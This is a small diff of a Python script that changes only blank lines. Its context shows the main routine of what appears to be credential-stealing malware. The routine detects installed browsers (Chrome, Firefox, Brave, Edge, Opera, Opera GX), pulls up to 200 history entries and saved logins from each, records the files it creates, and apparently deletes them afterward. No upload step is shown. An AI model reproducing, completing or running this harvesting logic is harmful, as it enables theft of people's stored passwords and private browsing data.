@@ -284,7 +284,6 @@ def delete_file(file_path):
     if os.path.exists(file_path):
         os.remove(file_path)
 
-
 def main():
     checked = []
 
@@ -336,12 +335,10 @@ def main():
     
     browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
     installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
-
     if not installed_browsers:
         return
 
     created_files = []
-
     for browser in installed_browsers:
         history = get_browser_history(browser, limit=200)
         if history:
@@ -351,7 +348,6 @@ def main():
         else:
             pass
 
-    
     for browser in installed_browsers:
         logins = get_browser_logins(browser, limit=200)
         if logins:
